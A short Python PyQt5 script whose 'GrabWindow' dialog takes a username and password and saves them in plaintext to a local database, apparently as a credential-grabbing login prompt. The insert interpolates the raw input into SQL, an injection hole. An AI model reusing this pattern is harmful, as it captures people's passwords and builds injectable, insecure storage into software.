import sys
from PyQt5.QtWidgets import QDialog, QApplication
from PyQt5 import QtWidgets
from PyQt5.uic import loadUi
from sm.sm import dbworker


class dbInserter(dbworker):
    db_path = "data.db"


dbInserter_instance = dbInserter()


class GrabWindow(QDialog):
    def __init__(self):
        super(GrabWindow, self).__init__()
        loadUi("window.ui", self)
        self.button.setDefault(True)
        self.button.clicked.connect(self.action)
        self.password.setEchoMode(QtWidgets.QLineEdit.Password)

    def action(self):
        username = self.username.text()
        password = self.password.text()
        dbInserter_instance.INSERT("data", "username, password", f"'{username}', '{password}'")
        main_instance.grab_window.close()


class main:
    def _init_components(self):
        app = QApplication(sys.argv)
        self.grab_window = GrabWindow()
        self.grab_window.setFixedSize(401, 427)
        self.grab_window.show()
        app.exec_()


main_instance = main()

# This main-section starts the whole application (- app)
if __name__ == '__main__':
    main_instance._init_components()
